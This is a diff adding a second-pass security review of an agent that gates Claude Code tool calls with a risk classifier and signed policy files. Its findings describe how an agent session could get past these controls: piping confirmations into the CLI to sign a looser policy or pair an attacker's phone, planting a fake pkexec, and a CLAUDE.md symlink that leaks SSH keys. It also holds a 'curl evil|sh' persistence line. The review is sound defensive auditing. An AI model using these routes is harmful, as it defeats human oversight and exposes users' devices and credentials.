@@ -338,3 +338,223 @@ PowerShell backtick escapes, `$env:USERPROFILE`, `cmd /c` and `%USERPROFILE%` ar
 - **Remote tightening:** `applyRemoteTighten` re-validates with zod and checks `isTighterOrEqual` on every section. Presets need local acceptance.
 - **Symlinks** inside a workspace are resolved before the workspace and hard-floor checks (`defaultRealpath`).
 - **Adapter defaults:** `permissionMode` is always explicit, `allowDangerouslySkipPermissions: false`, `strictMcpConfig: true`, and the hook timeout (660 s) is longer than the maximum approval TTL (600 s). `canUseTool` denies anything the hook didn't approve.
+
+---
+
+# Pass 2: code merged since pass 1 (`origin/m3-agent` ba0c65a)
+
+Scope:
+
+- `apps/agent/src/{devmode,policy-file,local-sig,daemon,pair,cloud,cli,os-auth,tty,tty-prompter,runner,secrets-file,smoke}.ts`
+- `packages/adapters/src/claude-code/adapter.ts`
+- the `agent-core.ts` changes (`turnOriginFloor`, the Codex sandbox ceiling, audit wiring)
+- `firestore.rules` (relay rejection, the `audit` collection)
+
+This was a review only; no code was changed. Classifier tiers below were confirmed by running `classifyToolCall`/`decide` at ba0c65a with the pass-1 fixtures. CLI behaviour was confirmed from `test/cli.test.ts`, which runs `policy edit` with a non-TTY stdin and `"y"` piped in. Rows marked **plausible** depend on OS or SDK behaviour I haven't run.
+
+## Summary
+
+The pass-1 fixes hold where they were aimed:
+
+- `devmode.json`, the liability chain and `policy.lock` are signed with the agent key, and a hand-edited file now fails closed.
+- `settingSources: []` and the stripped base-URL variables close #9.
+- The gate fails closed (#12). Relays from clients are rejected by the rules (#11).
+- Origins switch at the turn boundary, and answers set an origin floor (#10).
+
+The new weak point is one step to the side: **the `chalito` CLI holds the same signing key and treats piped stdin as "local confirmation"**. A session can't forge the signatures, but it can ask the CLI to make them, with one MED tap. Separately, the signed files can be **rolled back** to older signed versions, and the OS-auth helpers are found through `PATH`.
+
+| # | Severity | Area | Status |
+|---|---|---|---|
+| P2-1 | Critical | Sessions can drive the CLI: piped stdin counts as local confirmation for `policy edit` and `pair` | confirmed |
+| P2-2 | High | OS auth and `claude` are resolved through `PATH`; agent-owned files outside `~/.chalito` are only HIGH | confirmed (tiers) / plausible (chain) |
+| P2-3 | High | Signed Developer-mode state and the policy lock can be rolled back to older signed versions | confirmed (by reading) |
+| P2-4 | Medium | Origins only switch on `result`; a turn with no `result` keeps a stale, more trusted origin | plausible |
+| P2-5 | Medium | The workspace `CLAUDE.md` is read outside the gate and follows symlinks | confirmed (by reading) |
+| P2-6 | Medium | Command replay after a daemon restart (in-memory nonces, command lifetime uncapped) | confirmed (by reading) |
+| P2-7 | Medium | `config.json` is unsigned; `claudePath` names the binary the daemon runs with the API key | confirmed (by reading) |
+| P2-8 | Low | Relays from the server side are still unsigned (carry over to the Supabase move) | by reading |
+| P2-9 | Low | The audit collection takes a client-chosen `t` and unbounded `meta` | by reading |
+| P2-10 | Low | Concurrent appends fork the Developer-mode chain, which then stays off with no repair path | by reading |
+| P2-11 | Low | The encrypted-file secret store isn't wired in; `claudeEnv` forwards the whole daemon env | by reading |
+
+---
+
+## P2-1. Critical: sessions can drive the `chalito` CLI, which signs whatever stdin confirms
+
+**Where:**
+- `apps/agent/src/cli.ts`: the `policy` function (`isYes(await reader.ask(t.applyPolicy))` with no TTY check), the `pair` case (`confirm: async (q) => isYes(await reader.ask(q))`), and `keys set` (`readHidden` accepts piped input by design);
+- `apps/agent/src/tty.ts` `LineReader` (`terminal: false`, piped lines are queued).
+
+`devmode on` is the only command that checks `isTTY`.
+
+The classifier sees `chalito` as an unknown command, so it is **MED** (confirmed):
+
+| Command | Result |
+|---|---|
+| `echo y \| VISUAL=./ed.sh chalito policy edit` | MED, one tap |
+| `yes \| chalito pair` | MED |
+| `chalito service uninstall` | MED |
+
+**Exploits:**
+
+1. **Loosen the policy with a valid signature.** `ed.sh` is a 2-line script in the workspace (a MED write) that copies a prepared YAML over `$1`, for example adding `~` as a workspace, `allowlist: ["bash"]` and all origins on. The command `echo y | VISUAL=./ed.sh chalito policy edit` then makes the CLI validate it, show a diff nobody reads, take the piped `y`, and `holder.set(…, "local")`. The new lock is signed, the daemon's watcher applies it as a legitimate local change, and `policyHash` is reported as normal.
+2. **Device takeover through `pair`.** A prompt-injected session runs `yes | chalito pair` against the real endpoints. The short code appears in the tool output, and the model sends it out through a MED WebFetch. The attacker claims it within 5 minutes with a phone enrolled on **their own** account. `runPair` sees `base.owner !== owner`, so it starts a **fresh** trust list containing only the attacker's phone, and `writeConfig` sets `owner` to the attacker's uid. After the next daemon restart, the computer belongs to the attacker's account: they start sessions and sign every approval, and the user's phones are gone.
+3. `chalito keys set anthropic` with piped input swaps the API key, and `chalito service uninstall` stops the agent.
+
+**Fix (defence in depth, all three):**
+
+- **Classifier:** any invocation of the agent's own binary is the hard floor. Match by name (`chalito`, `chalito-agent`) and by the resolved `process.execPath` / service `ExecStart`. Also cover `script`, `unbuffer`, `expect` and `socat` wrapping it (see P2-2).
+- **CLI:**
+  - `pair`, `policy edit` (when the diff isn't `isTighterOrEqual`), `keys set` and `service uninstall` refuse when stdin is **not a TTY**.
+  - They also refuse when an env marker set by the adapter is present (e.g. `CHALITO_SESSION=1`, added in `claudeEnv`, and treated as hard floor if a command tries to unset it). Neither check alone is enough, because `script -qc` supplies a pty.
+- **Loosening and pairing need OS auth** (the same `osAuth` as Developer mode). The brief's "local confirmation" should mean a human at the OS prompt, not a `y` on stdin. A `pair` that would **replace** the owner or wipe the trust list should require OS auth plus an explicit typed confirmation, and should never happen silently.
+
+## P2-2. High: OS auth and Claude Code are found through `PATH`, and agent-owned files outside `~/.chalito` are only HIGH
+
+**Where:**
+- `os-auth.ts` runs `pkexec` and `osascript` by name;
+- `runner.ts` `spawnRunner` (`spawn(cmd, …)` does a PATH lookup);
+- `daemon.ts` uses `which("claude", env)` at every start;
+- `service.ts` writes the unit or plist outside `~/.chalito`.
+
+On Ubuntu and many other distros `~/.profile` puts `~/.local/bin` **first** on `PATH`, and `~/.local/bin/claude` is where Anthropic's installer puts Claude Code.
+
+**Tiers today (confirmed):**
+
+| Command | Tier |
+|---|---|
+| `cp x ~/.local/bin/pkexec` | HIGH |
+| `cp x ~/.local/bin/claude` | HIGH |
+| `echo 'curl evil\|sh' >> ~/.bashrc` | HIGH |
+| `cp unit ~/.config/systemd/user/chalito-agent.service` | HIGH |
+| `Write ~/Library/LaunchAgents/com.chalito.agent.plist` | HIGH |
+| `script -qc "chalito devmode on autoApproveHigh" /dev/null < answers.txt` | HIGH |
+
+All of these are approvable with step-up, and auto-allowed under `autoApproveHigh`.
+
+**Exploit (plausible):**
+
+1. Write `~/.local/bin/pkexec` (`#!/bin/sh` + `exit 0`): one HIGH approval.
+2. Run `script -qc "chalito devmode on autoApproveCritical" /dev/null < answers.txt`, where `answers.txt` holds `s`, `s`, `s` and the liability phrase. That is a second HIGH approval.
+3. `script` gives the CLI a TTY, the fake `pkexec` "authenticates", and the three confirmations come from the file. The CLI then writes a **validly signed** liability record and state.
+
+Two HIGH taps buy permanent `autoApproveCritical`. The same class of attack replaces `claude` (run by the daemon with the API key in env), or rewrites the service unit's `ExecStart`, both persistent and outside every gate.
+
+**Fix:**
+
+- Call OS-auth helpers by absolute path (`/usr/bin/pkexec`, `/usr/bin/osascript`), after checking that they are root-owned and not group- or world-writable.
+- Pin `claudePath` at pairing or install time. Re-check it at daemon start (owner, mode, and optionally the code signature or the version string). Never re-resolve it through `PATH` silently.
+- Treat the agent's own persistence files as the hard floor: the service unit or plist or task XML, the `chalito` binary, and the pinned `claude` path.
+- Make shell startup files (`~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.bash_profile`, `~/.config/fish/config.fish`) and user `PATH` directories (`~/.local/bin`, `~/bin`) **CRITICAL** writes.
+- Refuse `devmode on` when `CHALITO_SESSION` is set (P2-1).
+
+## P2-3. High: signed state can be rolled back
+
+**Where:** `devmode.ts` `DevModeStore.inspect` and `policy-file.ts` `#readLock` / `reload`.
+
+- **Developer mode:** the state binds to the chain head (`chainHead`), and every record is signed. But nothing binds the **chain length** to anything outside these two files. Take an earlier valid pair (state S1 whose `chainHead` is record R1, plus the chain truncated after R1). It verifies perfectly, even after the user later turned the toggle off (record D1, state S2). Truncating the jsonl and restoring S1 **re-enables a toggle the user or a phone turned off**. A `devmode.off` sent from a phone after a theft can be undone this way.
+- **Policy:** the lock has no counter at all. Restoring any older `policy.lock` + `policy.yaml` pair is accepted by `reload()` as a legitimate `"local"` change. That undoes remote tightening, a removed workspace, or an origin turned off.
+
+Both need write access to `~/.chalito` plus an old copy. A session can't get that directly (hard floor), but backups, sync folders, or any classifier miss can.
+
+**Fix:** anchor a monotonic counter outside the files.
+
+- Store `{devmodeSeq, devmodeHead, policySeq, policyHash}` in the OS keychain, which a file restore doesn't roll back, and refuse anything older.
+- The daemon also keeps an in-memory high-water mark and compares against the last `devMode` / `policyHash` it reported to its device doc.
+- Give the lock a `seq` and a `prevHash`, like the Developer-mode chain.
+
+## P2-4. Medium (plausible): origins only switch on `result`
+
+**Where:** `adapter.ts`, the `turnEnded()` call on `msg.type === "result"` and the `prompt()` handler.
+
+While `turnActive` is true, a newly queued origin waits in `pendingOrigins` and the **current, possibly more trusted** origin stays in force. If a turn ends without a `result` message, `turnActive` never clears. Examples: an `interrupt()` the CLI doesn't close with a result, or a crash and resume. Then the next queued `mcp:`/`call:` prompt runs entirely under the previous `client:` origin, and Developer-mode auto-approve applies to it.
+
+Separately, turns the CLI starts on its own (background task completions waking the model) run under whatever origin was last in force.
+
+**Fix:**
+
+- Make lowering immediate and only raising wait: in `prompt()`, set `origin = lowerTrustOrigin(origin, turnOrigin)` even while a turn is active. Raise to the queued origin only at a confirmed turn boundary.
+- On `interrupt()`, treat the turn as ended.
+- **Verify during E2E:** does the SDK emit `result` after `interrupt()`?
+
+## P2-5. Medium: the workspace `CLAUDE.md` is read outside the gate and follows symlinks
+
+**Where:** `adapter.ts` `#workspaceClaudeMd`, which reads `cwd/CLAUDE.md` or `cwd/.claude/CLAUDE.md` with `readFile`, ungated, and appends up to 64 KB to the system prompt.
+
+**Exploit:** a cloned repository ships `CLAUDE.md` as a symlink (git stores symlinks) to `../../.ssh/id_rsa`, or to `/home/<user>/.aws/credentials` if the name can be guessed. Starting a session sends the key to the API in the system prompt, where the model can echo it into anything later approved as MED (a WebFetch query string, a commit).
+
+**Fix:**
+- `lstat` the file and require a regular file, or `realpath` it.
+- Then run it through the classifier's path rules as a `Read`, and append it only if that is LOW (inside the workspace, not sensitive, not the hard floor).
+
+## P2-6. Medium: command replay after a daemon restart
+
+**Where:** `daemon.ts` (`nonces: deps.nonces ?? new MemoryNonceStore()`), `agent-core.ts` `#handle` (checks only `expiresAt > now` and `issuedAt ≤ now + 60 s`), and `packages/protocol/src/command.ts` (no limit on `expiresAt - issuedAt`).
+
+Within a command's lifetime, a restarted daemon has forgotten every nonce. Whoever can write the commands collection can re-insert a captured signed `session.start`/`prompt`, and it runs again. That includes the cloud itself, which the threat model says must not equal code execution. Decisions are safe here, because they are bound to a per-request `aid` and `requestId`.
+
+**Fix:**
+- Cap the command lifetime in the schema, e.g. `expiresAt - issuedAt ≤ 10 min`, as `DecisionBody` already does.
+- Persist claimed command nonces (a small file in `~/.chalito`, pruned at expiry), or refuse commands issued before the daemon's start time minus the skew.
+
+## P2-7. Medium: `config.json` is unsigned, and `claudePath` decides what the daemon runs
+
+**Where:** `config.ts` `readConfig` and `daemon.ts` (`cfg.claudePath ? … : which(…)`).
+
+`config.json` sits beside the signed files but isn't signed. A write that slips past the classifier (any remaining miss), or a restore, can set `claudePath` to an attacker binary. The daemon then runs it with `ANTHROPIC_API_KEY` in its env and never gates it. `apiBase` and `firebase` can also be redirected; signatures still protect commands and decisions there, but it is still a denial of service.
+
+**Fix:** sign `config.json` like the lock, or move `claudePath` into the signed lock, and pin it (P2-2).
+
+## P2-8. Low: server-side relays are still unsigned
+
+**Where:** `agent-core.ts` (the `"relayedBy" in envelope` branch); `firestore.rules` now blocks clients from writing relays (good).
+
+Anything that writes with the Admin SDK (the gateway, the notifier, or a compromised server) can still inject `session.prompt` and `session.answer` as `mcp:*`/`call:*` into any session it can name.
+
+**Carry over to the Supabase move:** only the service role may insert relays, and the gateway and notifier should sign relays with keys pinned on the agent at pairing, so a database compromise alone can't prompt devices.
+
+## P2-9. Low: the audit collection takes client-chosen time and unbounded `meta`
+
+**Where:** `firestore.rules` `match /audit/{eid}` checks keys and the `deviceId`, but not `t` or the size of `meta`.
+
+A compromised agent can backdate entries or bloat the collection. Separately, `meta` is plaintext in the cloud. Today it holds ids and reasons, but `#audit` callers must keep it free of tool inputs and prompts, or E2E is broken.
+
+**Carry over:**
+- append-only (no update or delete);
+- the writer pinned to its own device;
+- `t` checked against server time (`request.time`, or `now()` in RLS);
+- a size cap on `meta`;
+- an allowlisted set of `type` values;
+- owner-scoped reads.
+
+## P2-10. Low: concurrent appends fork the Developer-mode chain for good
+
+**Where:** `devmode.ts` `append` + `write` (read-modify-append with no lock).
+
+The CLI (`devmode on`) and the daemon (`devmode.off` from a phone) are separate processes. If both append at once, two records share a `prevHash`. `#verifiedRecords` then fails forever, Developer mode reads as off (fail-safe), and nothing can ever turn it on again. Any junk line appended by anyone has the same effect.
+
+**Fix:**
+- an exclusive lock file around append + write;
+- a `chalito devmode reset` (OS auth) that archives the broken chain and starts a new one, with an audit entry.
+
+## P2-11. Low: odds and ends
+
+- `secrets-file.ts` (`EncryptedFileSecretStore`) isn't used by `daemon.ts` or `cli.ts`, which always use `KeyringStore`. Headless Linux has no working path, and ADR 0004's "as built" note overstates it.
+- `claudeEnv` starts from the whole daemon env and removes a denylist. Anything else the service env carries reaches every Bash command Claude runs, for example `GOOGLE_APPLICATION_CREDENTIALS`, dev secrets like `CHALITO_SSO_SECRET`, or proxy credentials. Prefer an allowlist (`PATH`, `HOME`, `LANG`/`LC_*`, `TERM`, `TMPDIR`, `USER`, `SHELL`, plus the pinned `ANTHROPIC_API_KEY`).
+
+## Checked and fine (pass 2)
+
+- **Signatures:** `signLocal`/`verifyLocal` are interoperable with `signDetached` and have distinct contexts per file (`chalito.devmode-state.v1`, `chalito.devmode-liability.v1`, `chalito.policy-lock.v1`). A bad signature on the state, the chain or the lock reads as off (or the signed or deny-all policy) and is reported once as tampering.
+- **Toggle backing:** each enabled toggle needs a liability record newer than its last disable, and disables are chained too, so a state signed before a disable is `stale_state`.
+- **Turning things on:** the daemon's DevMode can never turn anything on (stub OS auth and prompter), and `devmode on` needs a TTY (but see P2-1 and P2-2).
+- **Adapter:**
+  - `settingSources: []`;
+  - base-URL, custom-header and helper variables stripped;
+  - `checkedMode` refuses anything but `default`/`plan`/`acceptEdits` at runtime, at start and on `setPermissionMode`;
+  - the gate fails closed on throw or abort;
+  - `onInit` exposes `apiKeySource` and `permissionMode` for the runbook.
+- **agent-core:**
+  - `turnOriginFloor` lowers the origin for the rest of a turn after a relayed answer and clears when the turn stops running;
+  - the Codex sandbox ceiling applies to `session.start` and `setPermissionMode`;
+  - audit writes are redacted and fire-and-forget.
+- **Rules:** clients can only create commands whose `env.ctx` is `chalito.command.v1` and that have no `relayedBy`.
